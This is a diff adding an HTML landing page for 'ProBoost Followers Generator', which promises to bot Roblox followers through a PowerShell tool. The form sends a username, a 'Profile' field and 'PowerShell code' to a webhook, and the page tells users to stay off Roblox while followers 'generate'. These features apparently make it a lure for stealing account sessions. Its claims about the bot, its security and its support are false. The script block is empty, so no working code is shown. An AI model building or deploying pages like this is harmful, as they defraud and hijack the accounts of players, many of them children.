@@ -1,0 +1,416 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   ProBoost Followers Generator
+  </title>
+  <!-- Favicon -->
+  <link href="logo.png" rel="icon" type="image/png"/>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+            background: linear-gradient(180deg, #1a1a1a, #333333, #4d4d4d, #666666);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+            color: white;
+            font-family: 'Roboto', sans-serif;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .bubble {
+            position: absolute;
+            bottom: -100px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            animation: rise 10s infinite;
+            z-index: 0;
+        }
+        @keyframes rise {
+            0% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-110vh);
+                opacity: 0;
+            }
+        }
+        main, footer {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .breathing-animation {
+            animation: breathing 3s ease-in-out infinite;
+            background: linear-gradient(90deg, rgba(0, 128, 255, 0.5), rgba(0, 255, 128, 0.5), rgba(255, 255, 255, 0.5));
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        @keyframes breathing {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+        .levitation {
+            animation: levitate 3s ease-in-out infinite;
+        }
+        @keyframes levitate {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 10;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: linear-gradient(180deg, rgba(36, 36, 62, 0.8), rgba(36, 36, 62, 0.5));
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+            border-radius: 10px;
+            font-family: 'Roboto', sans-serif;
+        }
+        .modal-content i {
+            color: green;
+            font-size: 50px;
+        }
+        .modal-content p {
+            font-size: 18px;
+            margin-top: 10px;
+        }
+        .modal-error {
+            background: linear-gradient(180deg, rgba(62, 36, 36, 0.8), rgba(62, 36, 36, 0.5));
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+            border-radius: 10px;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-error i {
+            color: red;
+            font-size: 50px;
+        }
+        .modal-error p {
+            font-size: 18px;
+            margin-top: 10px;
+        }
+        .input-transparent {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        .gradient-button {
+            background: linear-gradient(90deg, rgba(0, 128, 255, 0.5), rgba(0, 255, 128, 0.5));
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            transition: all 0.3s ease;
+            background-size: 200% 200%;
+            animation: gradient-move 3s ease infinite;
+        }
+        @keyframes gradient-move {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .gradient-button:hover {
+            transform: scale(1.05);
+        }
+        .gradient-button:active {
+            transform: scale(0.95);
+        }
+        .highlight {
+            font-size: 2.5rem;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5), 0 0 20px rgba(255, 255, 255, 0.5);
+            animation: levitate 3s ease-in-out infinite;
+        }
+        .lava-lamp {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -1;
+        }
+        .lava-lamp .bubble {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            position: absolute;
+            bottom: -100px;
+            animation: rise 10s infinite;
+        }
+        .shiny-border {
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            width: 80%;
+            max-width: 600px;
+        }
+        .glow-effect {
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 10px rgba(255, 255, 255, 0.5), 0 0 20px rgba(255, 255, 255, 0.5), 0 0 30px rgba(255, 255, 255, 0.5);
+            }
+            to {
+                text-shadow: 0 0 20px rgba(255, 255, 255, 1), 0 0 30px rgba(255, 255, 255, 1), 0 0 40px rgba(255, 255, 255, 1);
+            }
+        }
+        .pulse-effect {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            }
+            50% {
+                transform: scale(1.1);
+                text-shadow: 0 0 20px rgba(255, 255, 255, 1);
+            }
+            100% {
+                transform: scale(1);
+                text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            }
+        }
+        .bounce-effect {
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+        .fade-in {
+            animation: fadeIn 2s ease-in-out;
+        }
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        .slide-in {
+            animation: slideIn 1s ease-in-out;
+        }
+        @keyframes slideIn {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(0); }
+        }
+  </style>
+ </head>
+ <body>
+  <div class="lava-lamp" id="bubbles-container">
+  </div>
+  <header class="text-center p-4">
+   <h1 class="text-white font-bold text-4xl rgb-text glow-effect" style="font-family: 'Roboto', sans-serif;">
+    ProBoost
+   </h1>
+  </header>
+  <main class="text-center mt-10 flex flex-col items-center">
+   <section class="text-center mb-16">
+    <h2 class="text-4xl font-bold mb-8 text-white pulse-effect">
+     ⭐ ProBoost Followers Generator ⭐
+    </h2>
+    <p class="mb-8 max-w-2xl mx-auto">
+     Follower botting has never been easier. ProBoost has all the right tools to make the process seamless and efficient.
+    </p>
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
+     <div class="text-center p-4 bg-gray-800 rounded-lg shadow-lg slide-in">
+      <i class="fas fa-file-alt text-5xl text-blue-500 mb-2">
+      </i>
+      <p class="font-bold">
+       Follow the Setup
+      </p>
+      <p class="text-sm">
+       Get started by following our easy setup guide.
+      </p>
+     </div>
+     <div class="text-center p-4 bg-gray-800 rounded-lg shadow-lg slide-in">
+      <i class="fas fa-rocket text-5xl text-blue-500 mb-2">
+      </i>
+      <p class="font-bold">
+       Start the Process
+      </p>
+      <p class="text-sm">
+       Initiate the botting process with a few clicks.
+      </p>
+     </div>
+     <div class="text-center p-4 bg-gray-800 rounded-lg shadow-lg slide-in">
+      <i class="fas fa-check-circle text-5xl text-blue-500 mb-2">
+      </i>
+      <p class="font-bold">
+       Enjoy Your Followers
+      </p>
+      <p class="text-sm">
+       Watch your follower count grow effortlessly.
+      </p>
+     </div>
+    </div>
+    <button class="gradient-button text-white font-bold py-2 px-4 rounded mb-16 fade-in" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
+     Start Botting
+    </button>
+   </section>
+   <section class="bg-gray-900 bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center fade-in" id="tutorial">
+    <h3 class="text-2xl font-bold mb-4">
+     Our Mission
+    </h3>
+    <p class="mb-4">
+     ProBoost's Follower Botter is an advanced PowerShell-based Follower Bot &amp; Auto-Bot. It is capable of botting followers up to 4x faster than other competitors with DL technology. All you need to do is follow the setup below.
+    </p>
+    <p class="mb-4">
+     Your license is valid until August 27, 2025 12:00 AM EST.
+    </p>
+    <h3 class="text-2xl font-bold mb-4">
+     Tutorial
+    </h3>
+    <div class="flex justify-center mb-8">
+     <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/TpoJ7fKtMvI" title="YouTube video player" width="560">
+     </iframe>
+    </div>
+   </section>
+   <section class="flex flex-col md:flex-row items-center justify-center mb-16 fade-in">
+    <img alt="Roblox character with a background of followers" class="w-1/2 h-auto border-none levitation" height="300" src="https://placehold.co/300x300" width="300"/>
+    <p class="highlight ml-4 text-white bounce-effect">
+     Followers Generator
+    </p>
+   </section>
+   <section class="bg-gray-900 bg-opacity-50 p-16 rounded-lg mb-24 mx-4 shiny-border fade-in" id="followers-botter">
+    <h3 class="text-xl font-bold mb-4">
+     Followers Botter
+    </h3>
+    <div class="flex flex-col space-y-4">
+     <input class="p-2 rounded input-transparent text-white" id="username" placeholder="Username" type="text"/>
+     <input class="p-2 rounded input-transparent text-white" id="profile" placeholder="Profile" type="text"/>
+     <input class="p-2 rounded input-transparent text-white" id="followers" min="0" placeholder="Followers" step="1" type="number"/>
+    </div>
+    <button class="gradient-button text-white font-bold py-2 px-4 rounded mt-4" onclick="sendToWebhook()">
+     Start Botting
+    </button>
+   </section>
+   <section class="bg-gray-900 bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center fade-in">
+    <h3 class="text-2xl font-bold mb-4">
+     Additional Information
+    </h3>
+    <p class="mb-4">
+     ProBoost is constantly updated to ensure the best performance and security. Our team is dedicated to providing the best tools for your needs.
+    </p>
+    <p class="mb-4">
+     For any support or inquiries, please contact our support team at proboostsupport@gmail.com.
+    </p>
+    <p class="mb-4">
+     Stay tuned for more updates and features coming soon!
+    </p>
+   </section>
+   <section class="bg-gray-900 bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center fade-in">
+    <h3 class="text-2xl font-bold mb-4">
+     Why Choose ProBoost?
+    </h3>
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+     <div class="p-4 bg-gray-800 rounded-lg shadow-lg">
+      <h4 class="text-xl font-bold mb-2">
+       Fast and Efficient
+      </h4>
+      <p>
+       Our botting technology is designed to be fast and efficient, ensuring you get the followers you need in no time.
+      </p>
+     </div>
+     <div class="p-4 bg-gray-800 rounded-lg shadow-lg">
+      <h4 class="text-xl font-bold mb-2">
+       Secure and Reliable
+      </h4>
+      <p>
+       We prioritize your security and privacy. Our tools are built with the latest security measures to keep your data safe.
+      </p>
+     </div>
+     <div class="p-4 bg-gray-800 rounded-lg shadow-lg">
+      <h4 class="text-xl font-bold mb-2">
+       User-Friendly Interface
+      </h4>
+      <p>
+       Our platform is designed to be user-friendly, making it easy for anyone to use our tools without any technical knowledge.
+      </p>
+     </div>
+     <div class="p-4 bg-gray-800 rounded-lg shadow-lg">
+      <h4 class="text-xl font-bold mb-2">
+       24/7 Support
+      </h4>
+      <p>
+       Our support team is available 24/7 to assist you with any questions or issues you may have.
+      </p>
+     </div>
+    </div>
+   </section>
+  </main>
+  <footer class="text-center p-4 bg-gray-900 bg-opacity-50 relative overflow-hidden fade-in">
+   <p>
+    © 2024 ProBoost. All rights reserved.
+   </p>
+  </footer>
+  <div class="modal" id="modal">
+   <div class="modal-content">
+    <i class="fas fa-check-circle">
+    </i>
+    <p class="mt-4">
+     Generating Followers. Please wait 5-10 minutes.
+    </p>
+    <p>
+     [DO NOT ACCESS ROBLOX DURING THIS TIME]
+    </p>
+   </div>
+  </div>
+  <div class="modal" id="modal-error">
+   <div class="modal-content modal-error">
+    <i class="fas fa-times-circle">
+    </i>
+    <p class="mt-4">
+     Error: Please fill in all fields or include the PowerShell code.
+    </p>
+   </div>
+  </div>
+  <script>
+  </script>
+ </body>
+</html>
